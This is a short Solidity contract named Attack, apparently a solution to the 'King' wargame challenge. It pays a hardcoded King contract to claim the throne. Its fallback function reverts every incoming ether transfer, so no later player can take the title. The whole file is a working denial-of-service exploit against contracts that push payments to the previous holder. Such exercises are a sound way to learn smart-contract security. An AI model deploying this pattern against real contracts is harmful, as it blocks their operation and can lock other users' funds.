// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    
    // my aim is to become the king of the King.sol contract, then prevent anyone else from becoming the King

    address kingContract = 0xd231F46727A97C4E25Ae7953f0a9CC2f959469dc;

    function becomeTheKing() external payable {
        (bool success, ) = address(kingContract).call.value(msg.value)(""); // transferring the current prize 
        require(success, "Transaction failed");
    }

    // preventing the next player from being able to send me ether 
    fallback() external payable {
        revert('Sorry mate. I will remain the King.');
    }
}
